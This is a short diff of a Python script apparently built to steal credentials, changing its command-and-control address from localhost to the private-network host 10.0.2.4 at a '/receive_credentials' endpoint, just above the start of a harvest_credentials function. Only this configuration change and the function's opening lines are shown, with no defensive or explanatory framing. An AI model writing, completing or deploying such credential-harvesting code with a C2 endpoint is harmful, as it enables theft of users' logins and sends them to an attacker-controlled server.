@@ -14,7 +14,7 @@ import sqlite3
 import json
 import requests
 
-C2_SERVER_URL = "http://127.0.0.1:8000/receive_credentials"
+C2_SERVER_URL = "http://10.0.2.4:8000/receive_credentials"
 
 def harvest_credentials():
     credentials = []
